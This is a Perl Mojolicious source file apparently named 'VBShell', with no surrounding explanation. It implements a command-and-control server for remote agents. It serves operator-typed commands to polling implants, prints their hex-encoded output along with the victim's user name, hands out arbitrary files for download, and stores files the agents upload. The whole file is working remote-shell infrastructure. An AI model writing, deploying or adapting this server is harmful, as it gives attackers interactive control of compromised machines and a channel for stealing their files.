use strict;
use warnings;
use Term::ReadLine;
use Mojolicious::Lite -signatures;

my $term = Term::ReadLine->new("VBShell");
$term->ornaments(0);

sub hex2str { join "", map { chr hex } shift =~ /.{2}/g }

get '/stdin' => sub ($c) {
    my $name = $c->param('agent') || "?";
    my $user = hex2str($c->param('whoami') || "3f");
    #print "${name}\[${user}\]\$ "; $| ++;
    #chomp(my $cmd = <STDIN>);
    my $cmd = $term->readline("${name}\[${user}\]\$ ");
    $c->render(text => $cmd);
};

post '/stdout' => sub ($c) {
    my $name = $c->param('agent') || "?";
    my $user = hex2str($c->param('whoami') || "3f");
    my $output = hex2str($c->param('output') || '00');
    print $output, "\n";
    $c->render(text => 'ok');
};

get '/download' => sub ($c) {
    my $file = $c->param('file') || return $c->render(status => 404, text => "File not found");
    $c->reply->file($file);
};

post '/upload' => sub ($c) {
    my $name = $c->param('agent') || "?";
    my $user = hex2str($c->param('whoami') || "3f");
    for my $upload ($c->req->uploads->@*) {
        print "${name}\[${user}\] Save ", $upload->filename, " to: "; $|++;
        chomp(my $file = <STDIN>);
        $upload->move_to($file);
    }
    $c->render(text => "ok");
};

app->log->level('error');
app->start;
